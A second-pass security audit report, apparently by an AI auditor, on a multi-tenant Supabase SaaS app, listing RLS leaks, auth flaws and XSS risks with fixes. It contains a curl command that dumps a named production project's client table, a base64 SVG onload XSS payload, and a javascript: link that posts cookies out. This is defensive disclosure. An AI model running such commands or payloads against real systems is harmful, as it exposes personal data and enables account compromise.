# Deep Security Audit — 2026-05-12 (Second Pass)

**Auditor**: Claude Opus 4.7 (1M ctx)
**Scope**: Look for what the first audit (`AUDIT_MASTER_2026_05_12.md` + `FIXES_APPLIED_2026_05_12.md`) missed.
**Method**: Read-only Grep/Glob/Read + Supabase MCP `execute_sql` against prod (read-only).
**Result**: **40+ new findings**, 4 of them P0, 12 P1.

> **TL;DR — the headline:**
> Two anon RLS policies (`clients_public_quote_view` and `leads_public_quote_view`) have `USING (true)` and grant `SELECT` to the `anon` role. The Supabase anon key ships in every browser bundle. Therefore **anyone in the world can `curl` your Supabase REST endpoint and dump every client and every lead in every tenant**, including names, emails, phone numbers, addresses, and notes. This is the entire customer database of every tenant, leakable in one HTTP call. **Fix in < 5 minutes; ship today.**

---

## 🚨 Critical (P0) — fix immediately

### P0-D1 — `clients` and `leads` tables grant `SELECT (USING true)` to `anon`
- **Where**: prod DB, policies `clients_public_quote_view` and `leads_public_quote_view`.
- **Verified via**: `SELECT tablename, policyname, roles, cmd, qual FROM pg_policies WHERE policyname IN ('clients_public_quote_view','leads_public_quote_view');` → both return `roles={anon}, cmd=SELECT, qual=true`.
- **Attack**: With only the public `VITE_SUPABASE_ANON_KEY` (visible in every browser bundle), an unauthenticated attacker runs:
  ```
  curl 'https://bbzcuzqfgsdvjsymfwmr.supabase.co/rest/v1/clients?select=*&limit=10000' \
    -H "apikey: $VITE_SUPABASE_ANON_KEY"
  ```
  …and gets every row across every tenant. Same for `leads`.
- **Impact**: Complete cross-tenant PII breach. Includes `first_name`, `last_name`, `email`, `phone`, `address`, `notes`, `org_id`. This is a notifiable-breach event under **Loi 25** and **LPRPDE** the moment it is exploited or even arguably could have been. Compliance posture across the board collapses if this leaks.
- **Why the prior audit missed it**: It only enumerated `qual ILIKE '%true%'` patterns at a high level and treated `clients_public_quote_view` / `leads_public_quote_view` as "the public quote viewer needs this" — but the public quote viewer at `/api/quotes/public/:token` calls `getServiceClient()` (bypasses RLS entirely), so these anon policies are not needed.
- **Fix**:
  ```sql
  DROP POLICY clients_public_quote_view ON public.clients;
  DROP POLICY leads_public_quote_view  ON public.leads;
  ```
  If a future public-page actually needs filtered anon access, replace with `USING (EXISTS (SELECT 1 FROM quotes q WHERE q.client_id = clients.id AND q.view_token IS NOT NULL))` analogous to `quote_line_items_public_read` and only expose specific columns through a view.

### P0-D2 — `company_settings` grants `SELECT (USING true)` to `anon`
- **Where**: prod DB, policy `company_settings_public_read`.
- **Attack**: `curl '…/rest/v1/company_settings?select=*' -H "apikey: $ANON"` returns every tenant's company info: `company_name, logo_url, phone, email, website, street1, city, province, postal_code, country` for every org. The view in `server/routes/portal.ts:64-68` only needs `company_name, logo_url, phone` for one org and uses service role anyway.
- **Impact**: Vendor enumeration (lets attackers build a target list of every Lume customer), and partial business-email exposure that fuels phishing.
- **Fix**: replace `qual=true` with `USING (EXISTS (SELECT 1 FROM clients c WHERE c.org_id = company_settings.org_id AND c.portal_token IS NOT NULL))` or — better — drop the policy and serve via a public-safe RPC like `get_public_company_brand(org_id uuid)` that returns only `name + logo_url`.

### P0-D3 — `dev role override` lives in `localStorage` and is honored in prod-shipped code
- **Where**: `src/hooks/usePermissions.ts:27,29-39` exports `setDevRoleOverride()` and `getDevRoleOverride()`. `src/components/DevRoleSwitcher.tsx` uses `import.meta.env.DEV || location.hostname === 'localhost'` — but `setDevRoleOverride`/`getDevRoleOverride` themselves contain **no env guard** and are bundled in production.
- **Attack**: Any XSS or a malicious browser extension can `localStorage.setItem('lume-dev-role-override','owner')` and any feature in the SPA that uses `getDevRoleOverride()` (or downstream consumers) gets owner-level UI access. Combined with P0-D1/P0-D2 and the user already being on the page, this is a full client-side privilege escalation. (Server still enforces real role, but the UI exposes admin-only actions / CSRFable URLs / surfaces internal forms that may chain into other vectors.)
- **Fix**: gate the writer with `if (!import.meta.env.DEV) return;` and **delete the key from `localStorage` on every app boot in production**.

### P0-D4 — `/api/quotes/:id/track-view` accepts any UUID and uses service-role client → cross-org enumeration + notification spam
- **Where**: `server/routes/quotes.ts:131-205` (`router.post('/quotes/:id/track-view', …)`).
- **Code path**: regex says "if it's a UUID, look up by `invoices.id`; else by `view_token`." Uses `getServiceClient()` and **no auth, no rate-limit per token, no tenant check**.
- **Attack**:
  - **Enumeration**: brute-force any UUID, get back `invoice_number, client_id, org_id`. With `org_id` returned, an attacker can correlate with the dumps from P0-D1 to map clients to their invoices/quotes.
  - **Notification spam / DoS**: each call inserts a row in `quote_views`, increments `view_count`, and on first view inserts into `notifications`. An attacker can flood any single invoice with "client opened your quote!" notifications, poisoning analytics and stressing the DB.
- **Fix**: drop the `isUuid` branch entirely — accept only `view_token` (cryptographically random, not enumerable). The DB column is already there and used for the rest of the public flow.

---

## 🔴 High (P1) — this week

### P1-D1 — `/invitations/accept` accepts an unverified token for an existing user and attaches them to an org with no password challenge
- **Where**: `server/routes/invitations.ts:272-323`.
- **Attack**: An attacker who steals or guesses an invitation token (64-hex, stored **plaintext** in `invitations.token`, no constant-time compare) and knows or guesses the email — or who is the email recipient and already has a Lume account — can POST `/invitations/accept` and be silently added as a member to that org. No password / OTP / login challenge for the existing user. The existing user's *current session has nothing to do with this call*. Combined with P1-D2 (no rate-limit on token lookup), this is a viable cross-org join via token brute-force.
- **Fix**:
  - Hash tokens before storage (`sha256(token)` like `clients.portal_token_hash`).
  - For the "user already exists" branch, refuse silently and require the existing user to sign in *and then* accept the invitation while authenticated.
  - Constant-time compare.

### P1-D2 — Invitation token verify endpoint is unrate-limited and reveals validity
- **Where**: `server/routes/invitations.ts:375-417` (`GET /invitations/verify/:token`). `server/index.ts` does **not** rate-limit `/api/invitations/*`.
- **Attack**: 64-hex space is large, but a single endpoint returning 404 vs 200 with `email + role + org_name` is a classic oracle. With Redis rate-limiter absent for this prefix, an attacker can hammer the verify route from a single IP at thousands of QPS. Combined with the plaintext-token P1-D1, token-replay/disclosure becomes attractive.
- **Fix**: add `/api/invitations` to the per-IP and per-token redis presets in `server/index.ts`.

### P1-D3 — Invitation expiry mismatch: code = 48h, email body = "7 days"
- **Where**: `server/routes/invitations.ts:177` (`expires_at = now + 48h`) and `:215` (email says "This invitation expires in 7 days").
- **Attack**: not directly exploitable — but recipients miss the real deadline, re-trigger flow, and click stale resend links that may have been forwarded.
- **Fix**: align the email text with the code.

### P1-D4 — `/auth/verify-email`, `/auth/resend-verification`, `/auth/register*`, `/billing/create-checkout-session` all call `admin.auth.admin.listUsers()` per request → O(N) DoS + amplifies brute-force
- **Where**: `server/routes/auth.ts:90,154,210,282`; `server/routes/billing.ts:590-591`; `server/routes/invitations.ts:276`.
- **Attack**: `listUsers()` is unpaginated by default and walks the entire `auth.users` table. With ≥10k users this is multi-second per call. There is no rate-limit on `/api/auth/verify-email` (`server/index.ts` only rate-limits `/api/auth/*` via the global CSRF check, no Redis preset registered for `/api/auth/verify-*`). An attacker who knows the token format can fire 100 req/s and starve Postgres connections.
- **Also a security oracle**: `/auth/verify-email` uses `meta.verification_token !== token` (string-equality, non-constant-time). Combined with the slow `listUsers()` it's measurable.
- **Fix**: use `admin.auth.admin.getUserByEmail(email)` or a direct SQL lookup `SELECT id, raw_user_meta_data FROM auth.users WHERE email = $1`. Add a `redisRateLimit({preset:'auth'})` on `/api/auth/verify-email`, `/api/auth/resend-verification`, `/api/auth/register`, `/api/auth/register-checkout`.

### P1-D5 — `/dsr/erase/client/:id` and `/dsr/erase/lead/:id` rely entirely on a DB-side admin check
- **Where**: `server/routes/dsr.ts:64-103`.
- **Status**: the SECURITY DEFINER function `anonymize_client(p_client_id)` does check `has_org_admin_role(auth.uid(), v_org)` (verified via `pg_get_functiondef`). **Good** — but the route was made `STABLE` in the migration disaster from the prior audit. If that regression reoccurs, the DB-side check still works but the server-side route exposes the surface with zero defense-in-depth.
- **Fix**: add `isOrgAdminOrOwner(admin, auth.user.id, auth.orgId)` check in the route before calling the RPC. Same for `dsr_request` (currently any member can file a request that triggers a 30-day workflow).

### P1-D6 — `/invitations/update-role` lets one admin demote another admin (no owner-only guard)
- **Where**: `server/routes/invitations.ts:534-583`. Only `isOrgAdminOrOwner` is checked, not `isOwner`.
- **Attack**: A malicious admin can demote every other admin to `technician`, then perform admin-only actions unopposed (single-admin lockout). They cannot touch the owner thanks to `:559-561`.
- **Fix**: only owners can demote/promote `admin` roles. Admins can only update `sales_rep` ↔ `technician`.

### P1-D7 — `/invitations/remove-member` doesn't revoke Supabase sessions for the removed user
- **Where**: `server/routes/invitations.ts:588-637`. Sets `memberships.status='suspended'`, but the JWT in the removed user's browser stays valid until expiry (default 1h). They keep using the app until the token refreshes and the membership check fails.
- **Fix**: call `admin.auth.admin.signOut(userId)` and/or `revokeAllRefreshTokens(userId)` right after setting status.

### P1-D8 — `Auth.tsx` MFA check runs *after* `signInWithPassword` already established the session
- **Where**: `src/pages/Auth.tsx:32-43`.
- **Attack**: `signInWithPassword` succeeds first and the Supabase session is in `localStorage` (AAL1). The MFA "challenge" is just a UI gate — *not* an AAL2 step-up. If the user navigates anywhere else between the password screen and the MFA screen (or has another tab open watching auth state), they're already signed in. Network observers and any concurrent JS in the page (XSS, extensions) can use the AAL1 token immediately. MFA is essentially decorative.
- **Fix**: switch the MFA-enrolled flow to Supabase's proper AAL2 ladder: after `signInWithPassword` returns, immediately `mfa.challenge()` + `mfa.verify()` before treating the session as authenticated; if the user dismisses the modal, `signOut()`.

### P1-D9 — `localStorage` company-context (`STORAGE_KEY` in `CompanyContext.tsx`) lets XSS swap tenants instantly
- **Where**: `src/contexts/CompanyContext.tsx:65,174,184,216`; `src/lib/orgApi.ts:12`.
- **Attack**: a malicious browser extension or any XSS chunk sets `localStorage[STORAGE_KEY] = '<victim-org-uuid>'`. The SPA happily switches to that org on next render and starts firing `org_id`-bearing requests. RLS will block what's not in their memberships, but UI surfaces (autocomplete, search dropdowns) may issue queries that get rejected — which is itself an enumeration oracle ("is this org real?"). More importantly, any user belonging to multiple orgs can be silently swapped to a different org by malicious code while they're filling in a form, and the form submission goes to the wrong org.
- **Fix**: store the active org in `sessionStorage` (so it doesn't persist across tabs) and re-derive it from `memberships` on every mount; reject any value not in the current user's membership list before honoring it.

### P1-D10 — `Cron` shared-secret check uses `!==` (non-constant-time)
- **Where**: `server/routes/cron.ts:24`. Adversary can measure response time to learn `CRON_SECRET` length and prefix.
- **Fix**: `crypto.timingSafeEqual(Buffer.from(provided), Buffer.from(expected))` with length check first.

### P1-D11 — `/quotes/public/accept` stores raw `signature_data` (data URL) with no MIME/size validation → stored XSS vector when re-rendered
- **Where**: `server/routes/quotes.ts:775-782`. Inserts `file_url: signature_data` (a `data:image/...;base64,...` URL provided by the client) into `quote_attachments` with `file_type: 'image/png'` hardcoded — *but the client controls the actual content*.
- **Attack**: caller submits `signature_data = "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"`. When the org's UI later renders `<img src={attachment.file_url}>` the SVG is displayed inline and any `onload`/embedded `<script>` fires in the org's context — full stored XSS into the org's authenticated session.
- **Fix**:
  - Validate signature_data starts with `data:image/png;base64,` (one allowed mime).
  - Cap at 200KB.
  - Decode + verify PNG magic bytes (`89 50 4E 47 0D 0A 1A 0A`).
  - Better: upload to Supabase storage, never store data URLs in DB columns that get rendered.

### P1-D12 — `EmailTemplatePicker` DOMPurify config allows `style` + `href` → CSS-injection + `javascript:` URI bypass on older browsers
- **Where**: `src/components/EmailTemplatePicker.tsx:170`. `ALLOWED_ATTR: ['href','style','class']`.
- **Attack**: rendered email templates can embed `<a href="javascript:fetch('/api/internal',{method:'POST',body:document.cookie})">` — DOMPurify blocks `javascript:` on `href` by default in modern versions but only if `ADD_URI_SAFE_ATTR` is not abused. `style` is dangerous on its own (`style="background:url(javascript:...)"` in legacy IE/some Outlook variants, `expression()` in old IE). For an internal preview component this matters less, but: if previews are ever sent to clients via `srcdoc`-style iframes or rendered server-side without DOMPurify, this is a stored XSS.
- **Fix**: drop `style` from `ALLOWED_ATTR`; use `RETURN_TRUSTED_TYPE: true` and `FORBID_TAGS: ['style','script']` explicitly.

---

## 🟠 Medium (P2) — this month

### P2-D1 — `agent JWT verifyAgentJwt` uses `timingSafeEqual` on buffers of potentially different lengths → throws
- **Where**: `server/routes/agent-auth.ts:67`. `timingSafeEqual` throws on length mismatch; the surrounding `try` swallows it and returns `null`. Net effect is correct, but the `try` makes the timing-safe property *itself* potentially leak length info because the throw is fast-path. Use `Buffer.byteLength(sig) === Buffer.byteLength(expected)` check first then `timingSafeEqual`.

### P2-D2 — `RegExp` UUID validator in `/quotes/track-view` (line 137) is permissive
- Accepts mixed case + doesn't pin to v4. Combined with service-role lookup (P0-D4) this widens enumeration. After fixing P0-D4 this becomes a non-issue.

### P2-D3 — Frontend `lume-search-history` in `localStorage` may persist client/lead names indefinitely
- **Where**: `src/components/CommandPalette.tsx:74-81`. Stores last 5 searches. On a shared workstation, the next user reads the previous user's prospect names.
- **Fix**: store in `sessionStorage` or clear on `auth.signOut`.

### P2-D4 — `auth.admin.listUsers()` results not paginated → returns max 50 users by default
- **Side-effect**: in `/auth/register` the "user already exists, resend verification" branch will silently fail to find existing users past the first page on a busy org. Net result: legitimate users register the "right" email and never get the verification email; in dev this is masked by small user counts.

### P2-D5 — `clients_active`, `jobs_active`, `leads_active` views are `security_invoker=true` — good — but `org_a2p_status` and `tasks_active` are `security_invoker=on` (notation inconsistency)
- Both spellings work in Postgres, but inconsistency suggests two different authors touched it. Verify via grant-table sweep that all `v_*` views respect RLS of underlying tables — `v_revenue_analytics`, `v_pipeline_overview`, `v_client_portfolio`, `v_job_full`, `v_schedule_calendar` are `security_invoker=true`. ✅ confirmed.

### P2-D6 — `clients_active` view leaks `email_blind` and `phone_blind` columns
- **Where**: `pg_get_viewdef('public.clients_active')`. The view selects `email_blind, phone_blind` (likely SHA-256/blind-index versions). If the underlying RLS allows reading these for anon (it does — see P0-D1), an attacker can reverse via dictionary attack on common phones/emails. Even after P0-D1 is fixed, ensure no anon SELECT on `clients_active` either.

### P2-D7 — `getServiceClient()` used in 34/49 route files (232 occurrences) without uniform post-fetch `org_id` filtering
- The pattern relies on each handler manually adding `.eq('org_id', auth.orgId)`. With Stripe webhook fixes done (`F-32` in prior audit), this is mostly OK, but `server/routes/quotes.ts:131-205`, `server/routes/portal.ts`, `server/routes/public-pay.ts` use service-role with no org_id filter at the start of the query because the lookup key (view_token / publicToken) is supposed to scope the result. **Lint rule**: add an ESLint custom rule that flags `getServiceClient()` followed by `.from('<sensitive_table>')` without `.eq('org_id', …)` within N lines unless the file is whitelisted as "public token lookup".

### P2-D8 — `/dsr/consent` accepts client-supplied `org_id` and `subject_id` with no membership check
- **Where**: `server/routes/dsr.ts:144-167`. Comment says "user authentifié OU anonyme (cookie banner sur page publique)" — but accepts a `subject_id` referencing any user/client/lead anywhere. An attacker can manufacture consent records for any subject in any org.
- **Fix**: if anonymous, only allow `subject_type='user'` with the subject being a freshly-created session/anon cookie identifier; for `client`/`lead`, require authenticated context bound to the org.

### P2-D9 — `dsar_requests` policy `dsar_insert_self` allows any org member to file a request on behalf of any subject in their org
- **Combined with no rate-limit** (`/api/dsr` is rate-limited but `dsr_request` is in the same path), an admin's malicious junior can file thousands of erasure requests on every client, triggering 30-day workflows + (eventually) anonymization if not reviewed.
- **Fix**: require admin/owner for erasure requests on third-party subjects.

### P2-D10 — `/dsr/export/me` exposes verbatim SQL error message in the response
- `server/routes/dsr.ts:35`: `return res.status(500).json({ error: error.message });`. The sanitizer in `server/index.ts:457-471` only fires for *unhandled* errors — explicit `res.json({error})` bypasses it. Same pattern in `:53, :77, :100, :135, :165`. Add a sanitize call.

### P2-D11 — `Permissions-Policy: geolocation=(self)` — but the app uses Mapbox third-party iframe
- **Where**: `server/index.ts:94`. If Mapbox is embedded via iframe (it isn't currently, but `child-src: 'self' blob:` and `frame-src` only lists Stripe/PayPal — so map is built in-page, OK) this is consistent. Confirmed safe.

### P2-D12 — CSP allows `img-src 'self' data: https: blob:`
- Wildcard `https:` permits exfiltration via image src to *any* https domain. Lock down to specific CDNs (Supabase storage, Mapbox tiles, Stripe icons). Wildcard image src is a classic data-exfiltration channel for stored XSS.

### P2-D13 — CSP `connect-src` includes `https://*.supabase.co wss://*.supabase.co`
- Multi-tenant Supabase wildcard means a stored XSS can `fetch('https://attacker-project.supabase.co/rest/v1/...')` and exfiltrate everything. Lock to the specific project ref (`bbzcuzqfgsdvjsymfwmr.supabase.co`).

### P2-D14 — CSP missing `report-only` mirror
- All CSP violations go to `/api/security/csp-report` but there's no `Content-Security-Policy-Report-Only` shadow header to test tighter directives before enforcement. Mid-prio.

### P2-D15 — `CORS` allows `credentials: true` AND `process.env.NODE_ENV !== 'production'` allows all `localhost`/127.0.0.1 origins
- If a dev server is exposed to a LAN (or running on a public IP behind a tunnel), an attacker on the same network can mount cross-origin credentialed attacks. Acceptable in true local dev only.

### P2-D16 — `auth.admin.createUser({email_confirm: true})` in `/auth/register-checkout`
- **Where**: `server/routes/auth.ts:271`. The user is fully sign-in-able before they've clicked the verification email. The "email verified" gate is only at `/billing/create-checkout-session:592-603` which checks `user_metadata.billing_email_verified`. Any other endpoint or future flow can ignore the metadata and let an unverified email act.
- **Fix**: use `email_confirm: false`; do not let the user sign in until verified.

### P2-D17 — `/billing/create-checkout-session` has no rate limit by IP or email
- **Where**: `server/routes/billing.ts:578`, mounted under `/api/billing` which is **not** in the `redisRateLimit` block in `server/index.ts`. An attacker can spam this endpoint, which both walks all users (P1-D4) AND creates Stripe customers (each `stripe.customers.create` costs API quota and pollutes the Stripe dashboard).
- **Fix**: add `redisRateLimit({preset:'strict', keyFn: req => 'checkout:'+(req.body?.email||extractIP(req))})`.

### P2-D18 — `Auth.tsx` Google OAuth uses `redirectTo: window.location.origin` (root) — not validated
- **Where**: `src/pages/Auth.tsx:75-78`. Returns to `/` regardless of where user was. Combined with the lack of OAuth `state`/`PKCE` config (relies on Supabase defaults — those are PKCE by default, OK), but the redirect target is not validated for an in-app `next=` param. If you later add `?next=…` handling, validate it against an allowlist.

### P2-D19 — `Auth.tsx` reset-password redirects to `/settings` regardless of org context
- **Where**: `:228`. If user is on org A and clicks reset-password, the reset link redirects them to `/settings` — but Supabase's reset link contains an access token that signs them in. They could land on a stale-cached `/settings` for the wrong org. Cosmetic for now.

### P2-D20 — `failed_login_attempts_public_insert` policy lets `anon` insert any email
- **Where**: prod policy. Attackers can poison the rate-limit table by inserting failed-login rows for victim emails to lock them out (if the consumer checks `count() > threshold` then deny).
- **Fix**: require a server-issued challenge token to insert, or only insert via service-role from the server.

### P2-D21 — `surveys_select_anon` + `surveys_update_anon` allows any anon to UPDATE a survey that hasn't been submitted
- **Where**: prod policies. `cmd=UPDATE, qual='(submitted_at IS NULL)', with_check='(submitted_at IS NOT NULL)'`. An anon caller can update ANY pending survey (not just one they have the token for) — there's no token check in the policy. They can stuff every pending survey with manipulated answers as long as they enumerate IDs.
- **Fix**: tighten qual to `(submitted_at IS NULL AND token = current_setting('request.jwt.claims', true)::jsonb->>'survey_token')` — or require the API to be the only writer (revoke anon, server validates token + uses service role).

### P2-D22 — `quote_views_insert_anon` policy lets anon insert tracking rows for any non-deleted invoice
- Compounds P0-D4. Even after fixing the API route, the RLS still allows direct REST POSTs to `quote_views` with any `invoice_id`. Tighten to require correlation with a `quote.view_token` join.

### P2-D23 — `confidence_calibration`, `decision_outcomes`, `dead_letters`, `email_opt_outs`, `email_templates_service`, `field_*_service`, `org_invoice_sequences_service`, `review_requests_service`, `sms_opt_outs`, `user_agent_preferences`, `webhook_events_service_all` all have `qual=true / with_check=true` for the **default role set** (no `TO service_role` restriction).
- Verify via the `pg_policies.roles` column — many of these likely apply to `{public}` (the default), which means `anon`/`authenticated` can also slip through. Several of these tables hold sensitive data (`email_opt_outs`, `sms_opt_outs`, `dead_letters`, `webhook_events`). Audit each: if `roles={public}` and `qual=true`, **that's a P0-D1-equivalent leak for that table**.
- The query I ran was `(qual ILIKE '%true%' OR …)` which captures these, but I didn't re-check the `roles` column on each — do this:
  ```sql
  SELECT tablename, policyname, roles, cmd
  FROM pg_policies
  WHERE schemaname='public' AND (qual='true' OR with_check='true')
    AND NOT ('service_role' = ANY(roles));
  ```

### P2-D24 — Service-role policies named `*_service` mostly do `cmd=ALL qual=true with_check=true` — fine for service role, dangerous if the policy isn't restricted to that role
- Same root cause as P2-D23. Verify `roles={service_role}` on every `_service`/`_service_full_access`/`_service_all` policy.

### P2-D25 — `pg_policies` shows `client_tags_insert` only requires membership in the client's org, but `client_tags` table has no SELECT/UPDATE/DELETE policy listed in the same scan
- Either RLS is enabled with no read policy (effectively locked — verify via my earlier `pg_class.relrowsecurity=true AND NOT EXISTS policies` query, which returned **empty** — meaning every RLS-enabled table has at least one policy) or there's an implicit policy I missed. Verify per-table CRUD coverage.

### P2-D26 — `webhook_events` table denies `anon/authenticated` but `service` policy is unrestricted (`webhook_events_service_all`, `qual=true with_check=true`)
- ✅ OK as long as the `roles` column on `_service_all` is `{service_role}`. Not verified — verify.

### P2-D27 — `getDevRoleOverride` is also called outside DEV gate; bundled in `usePermissions.ts` which is imported by every page
- Tree-shaking will not eliminate it. The whole prod bundle contains the helper that reads `localStorage['lume-dev-role-override']`.

### P2-D28 — `CourseView.tsx` DOMPurify uses default profile
- **Where**: `src/pages/CourseView.tsx:195` `DOMPurify.sanitize(activeLesson.text_content)` with no options. The default allows `<svg>`, `<math>`, MathML attributes, etc. SVG can contain `<foreignObject>` with HTML. Restrict via `USE_PROFILES: { html: true }, FORBID_TAGS: ['svg','math','iframe','form'], FORBID_ATTR: ['style','on*']`.

### P2-D29 — `OnboardingFlow.tsx` puts user email, plan slug, plan id, interval, full name in `sessionStorage`
- Email/name/plan are not super-sensitive, but `onb_token` (`access_token`) is. Lines `:291-292`. Persisted access tokens in sessionStorage are XSS-readable. Use cookies or recompute.

### P2-D30 — `clients_active` view includes `portal_token` and `notes` columns
- These leak through any consumer of `clients_active` that anon/authenticated can see via the underlying-table RLS leak (P0-D1). Even after P0-D1 fix, drop `portal_token` from the view — invoker-views still apply, but it's defense in depth.

### P2-D31 — Cron jobs (`alerts-engine`, `scheduled-reports`, `security-maintenance`) use `withAdvisoryLock` keyed by string — collision risk
- Lock names are simple strings. If two unrelated jobs ever choose the same name (e.g. a future plugin), they'll silently exclude each other. Document the lock-name registry.

### P2-D32 — `applySecurityMiddleware` and rate-limit setup applies the **in-memory rate limiter** AND the Redis one for the same path; under high QPS with Redis available, the second middleware path runs anyway
- **Where**: `server/index.ts:245-277`. The `if (!useRedis)` only gates the in-memory ones; the Redis ones are always registered. If `useRedis=true`, only Redis runs — OK. If `useRedis=false`, the in-memory runs and the *registered-but-unconfigured* Redis middleware short-circuits — verify `redisRateLimit` no-ops gracefully when Redis is missing (read the impl).

### P2-D33 — `sendVerificationEmail` HTML template does not HTML-escape the user-controlled `name` field
- **Where**: `server/routes/auth.ts:34`. `<strong>${name}</strong>` is interpolated directly. If the email view escapes, fine — most clients render HTML. An attacker can put `<img src=x onerror=…>` in their fullName at registration and the verification email becomes an HTML-injection vector to their own inbox. Low impact (they're attacking themselves) but if forwarded to admins or quarantined, could matter.

### P2-D34 — `invitations.token` stored plaintext in DB
- The migration `20260512170*` did not add a `*_token_hash` mirror as was done for `clients.portal_token_hash`. If `invitations` table is dumped, every pending token is usable. Add `invitations.token_hash` and lookup by hash.

### P2-D35 — `passwordSchema` doesn't check against common-password breach lists (HIBP / Pwned Passwords)
- **Where**: `server/lib/validation.ts:33-39`. Allows `Password12!` (meets all rules, breach-list hit). Consider HIBP k-anonymity check on register.

### P2-D36 — No max-attempts lockout on `signInWithPassword` (delegated to Supabase Auth)
- Supabase's default failed-login lockout is permissive. The `failed_login_attempts` table exists but is anon-writable (see P2-D20) so as a defense it's weak. Consider Cloudflare Turnstile or hCaptcha on the auth form after 3 attempts.

### P2-D37 — `OAuthCallback.tsx` (and Register/VerifyEmail) — open redirect via `redirectTo` not validated
- Confirmed for `Auth.tsx:75` (already P2-D18). Audit `OAuthCallback.tsx` similarly.

### P2-D38 — `usePermissions.invalidatePermissionsCache()` is a no-op — comment says "CompanyContext handles refresh"
- If a role is changed server-side, the cache in `server/lib/rbac.ts:148` lives 60s. UI doesn't know to force-refresh. Stale-permission window of 60s for *every* permission check after role change. For demotions this is a real escalation window.

### P2-D39 — `server/index.ts` CSRF middleware exempts paths starting with valid `X-Requested-With` header, but **also** exempts requests with `application/json` content-type
- **Where**: `:178-179`. Modern browsers permit `<form enctype='text/plain'>` to send arbitrary JSON-shaped bodies. Since the check is `content-type INCLUDES 'application/json'`, an attacker can craft a form that fires `application/json` (some browsers honor it via Service Workers). The Authorization or X-Requested-With requirement is the real protection — the Content-Type fallback is *not* CSRF-safe and should be removed.

### P2-D40 — `dsr_requests` insert doesn't enforce that `subject_id` resolves to a real subject in the same org
- **Where**: `server/routes/dsr.ts:120-133`. Insert is straight DB write. Attacker org member can submit a request for a random UUID; the `dsar_requests` row counts toward compliance SLA and may cause confused workflow.

---

## 🟡 Low (P3) — backlog

### P3-D1 — `console.log` of pricing data
- `[billing/create-checkout-session]` logs `Blocked: user ${email} email not verified` — PII (email) in logs.

### P3-D2 — `console.log('[security] payments encryption key validated (32 bytes)')`
- Logs the fact the key exists. Confirms infra detail to anyone reading logs. Move to debug-level.

### P3-D3 — `noteBoardsApi.ts`, `notesApi.ts`, `measurementApi.ts`, `specificNotesApi.ts`, `ClientDetails.tsx`, `JobDetails.tsx`, `D2DOnboarding.tsx` all call `supabase.storage.from('attachments').upload(path, file, …)` with **no client-side MIME or size validation**.
- Server-side bucket policies must enforce — verify Supabase storage bucket `attachments` has a max-file-size and allowed-mime-types policy. (Not visible from code, requires Supabase dashboard check.) If absent, users can upload arbitrary binaries up to Supabase's default (~50MB) and serve them as part of the org.

### P3-D4 — `getPublicUrl` on uploaded attachments returns **public** URLs from the `attachments` bucket
- See `JobDetails.tsx:138`, `D2DOnboarding.tsx:88`. Any uploaded file is public — pasting the path enumerates other orgs' uploads if path is guessable. Switch to signed URLs.

### P3-D5 — `useOfflineCache.ts` stores per-key arrays in `localStorage` with no expiry sweep
- Lines `:81-85`. Unbounded growth.

### P3-D6 — `i18n` keys leak to anon (`/api/i18n/...` doesn't exist — i18n is bundled). N/A. ✅

### P3-D7 — `Sentry` dsn from `VITE_SENTRY_DSN` is public — by design — but is logged on init.
- ✅ expected.

### P3-D8 — `consentApi.ts` stores consent state in `localStorage` keyed only by user uuid
- Lines `:42-65`. Multi-tenant: if one user has multiple orgs, consent persists across.

---

## ✅ What's good (defenses that actually work)

1. **No tables without RLS** — the `pg_class.relrowsecurity=true AND NOT EXISTS policies` query returned **empty**. Every table has at least one policy.
2. **No tables with RLS disabled** — same query confirms.
3. **`payments`, `connected_accounts`, `payment_provider_secrets`, `subscriptions`** all use `service_role`-restricted policies. The Stripe-side fixes from the prior audit are in place (`F-18`, `F-19`, `F-32`).
4. **Stripe webhook raw-body mount before `express.json()`** — correctly handled (`server/index.ts:214`).
5. **Hard-fail on missing `AGENT_JWT_SECRET`** — `:41-44`.
6. **`portal.ts` is exemplary**: hash lookup with plaintext fallback, constant-time compare, expiry + revocation checks, random sleep on miss to defeat timing oracles.
7. **CSP is real**: `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, no `unsafe-inline` on scripts in prod, no `unsafe-eval` in prod.
8. **CSRF custom-header check** is in place (`:170-181`) — modulo P2-D39 about the content-type fallback.
9. **SECURITY DEFINER `anonymize_client`** properly checks `has_org_admin_role` — but route should add defense in depth (P1-D5).
10. **All `v_*` analytical views are `security_invoker=true`** — RLS of underlying tables applies (so they inherit P0-D1's leak too, but the views themselves don't *amplify* the leak).
11. **Cron is mounted** and `CRON_SECRET` is required (modulo P1-D10 timing).
12. **Beta-bypass list moved server-side** (verified — only `BETA_BYPASS_EMAILS` without `VITE_` prefix in `server/routes/me.ts:11`).
13. **Password sessionStorage removed** (verified — `OnboardingFlow.tsx:171` comment + no `onb_pw` writes).
14. **No `dangerouslySetInnerHTML` without sanitization** in the entire `src/` tree — only 2 occurrences, both sanitized (modulo configuration concerns in P1-D12 and P2-D28).

---

## 📋 Recommended ship order

| When | What |
|---|---|
| **Today (< 30 min)** | Drop the 3 anon `USING (true)` policies on `clients`, `leads`, `company_settings` (P0-D1, P0-D2). Drop the UUID branch in `quotes/track-view` (P0-D4). Add `import.meta.env.DEV` guard on `setDevRoleOverride` + delete-on-boot in prod (P0-D3). |
| **This week** | All P1: invitation hardening (P1-D1 through D3), fix `listUsers()` walk → `getUserByEmail` (P1-D4), MFA AAL2 step-up in `Auth.tsx` (P1-D8), constant-time cron secret (P1-D10), signature data validation (P1-D11), DOMPurify config tighten (P1-D12), admin-only DSR erase (P1-D5), owner-only role updates (P1-D6), session revocation on remove (P1-D7), tenant-context hardening (P1-D9). |
| **This month** | P2 batch — especially the policy-roles audit (P2-D23/D24/D26), `webhook_events` and the rest of `_service` policies. Run the verification query in P2-D23 and triage. |
| **Backlog** | P3 — storage bucket policies, signed URLs, HIBP password check, etc. |

---

## 📊 Score impact

Prior audit landed remediation at **~8.5/10**. Counting these new findings:
- 4 P0 (anon `clients`/`leads`/`company_settings` SELECT + DevRole-in-prod + track-view enumeration) → drops to **~6.0** until fixed.
- After fixing the 4 P0s → back to ~8.3.
- After P1 batch → **9.0**.
- After P2 (RLS roles audit + storage policies) → 9.3.

The single biggest deltas: the **anon-on-clients/leads** RLS policy is a real notify-the-regulator event if exploited. Everything else is normal hardening.

---

🤖 Deep audit by Claude Opus 4.7 (1M ctx) on 2026-05-12. Read-only — no DB or code mutations performed.
